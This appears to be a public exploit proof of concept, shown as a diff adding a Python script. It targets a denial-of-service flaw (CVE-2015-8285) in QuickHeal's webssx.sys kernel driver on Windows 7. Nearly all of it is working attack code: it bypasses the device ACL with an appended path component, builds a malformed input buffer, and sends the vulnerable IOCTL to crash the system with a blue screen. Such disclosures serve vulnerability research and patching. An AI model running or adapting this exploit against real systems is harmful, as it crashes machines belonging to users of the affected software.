@@ -1,0 +1,78 @@
+# Exploit Title: QuickHeal webssx.sys driver DOS vulnerability
+# Date: 19/02/2016
+# Exploit Author: Csaba Fitzl
+# Vendor Homepage: http://www.quickheal.co.in/
+# Version: 16.00
+# Tested on: Win7x86, Win7x64
+# CVE : CVE-2015-8285
+
+from ctypes import *
+from ctypes.wintypes import *
+import sys
+
+kernel32 = windll.kernel32
+ntdll = windll.ntdll
+
+#GLOBAL VARIABLES
+
+MEM_COMMIT = 0x00001000
+MEM_RESERVE = 0x00002000
+PAGE_EXECUTE_READWRITE = 0x00000040
+STATUS_SUCCESS = 0
+
+def alloc_in(base,evil_size):
+	""" Allocate input buffer """
+	print "[*] Allocating input buffer"
+	baseadd   = c_int(base)
+	size = c_int(evil_size)
+	evil_input = "\x41" * 0x10
+	evil_input += "\x42\x01\x42\x42" #to trigger memcpy
+	evil_input += "\x42" * (0x130-0x14)
+	evil_input += "\xc0\xff\xff\xff" #this will cause memcpy to fail, and trigger BSOD
+	evil_input += "\x43" * (evil_size-len(evil_input))
+	ntdll.NtAllocateVirtualMemory.argtypes = [c_int, POINTER(c_int), c_ulong, 
+											  POINTER(c_int), c_int, c_int]
+	dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFF, byref(baseadd), 0x0, 
+											 byref(size), 
+											 MEM_RESERVE|MEM_COMMIT,
+											 PAGE_EXECUTE_READWRITE)
+	if dwStatus != STATUS_SUCCESS:
+		print "[-] Error while allocating memory: %s" % hex(dwStatus+0xffffffff)
+		sys.exit()
+	written = c_ulong()
+	alloc = kernel32.WriteProcessMemory(0xFFFFFFFF, base, evil_input, len(evil_input), byref(written))
+	if alloc == 0:
+		print "[-] Error while writing our input buffer memory: %s" %\
+			alloc
+		sys.exit()
+
+if __name__ == '__main__':
+	print "[*] webssx BSOD"
+	
+	GENERIC_READ  = 0x80000000
+	GENERIC_WRITE = 0x40000000
+	OPEN_EXISTING = 0x3
+	IOCTL_VULN	= 0x830020FC
+	DEVICE_NAME   = "\\\\.\\webssx\some" #add "some" to bypass ACL restriction, (FILE_DEVICE_SECURE_OPEN is not applied to the driver)
+	dwReturn	  = c_ulong()
+	driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
+
+	inputbuffer	   = 0x41414141 #memory address of the input buffer
+	inputbuffer_size  = 0x1000
+	outputbuffer_size = 0x0
+	outputbuffer	  = 0x20000000 
+	alloc_in(inputbuffer,inputbuffer_size)
+	IoStatusBlock = c_ulong()
+	if driver_handle:
+		print "[*] Talking to the driver sending vulnerable IOCTL..."
+		dev_ioctl = ntdll.ZwDeviceIoControlFile(driver_handle,
+									   None,
+									   None,
+									   None,
+									   byref(IoStatusBlock),
+									   IOCTL_VULN,
+									   inputbuffer,
+									   inputbuffer_size,
+									   outputbuffer,
+									   outputbuffer_size
+									   )
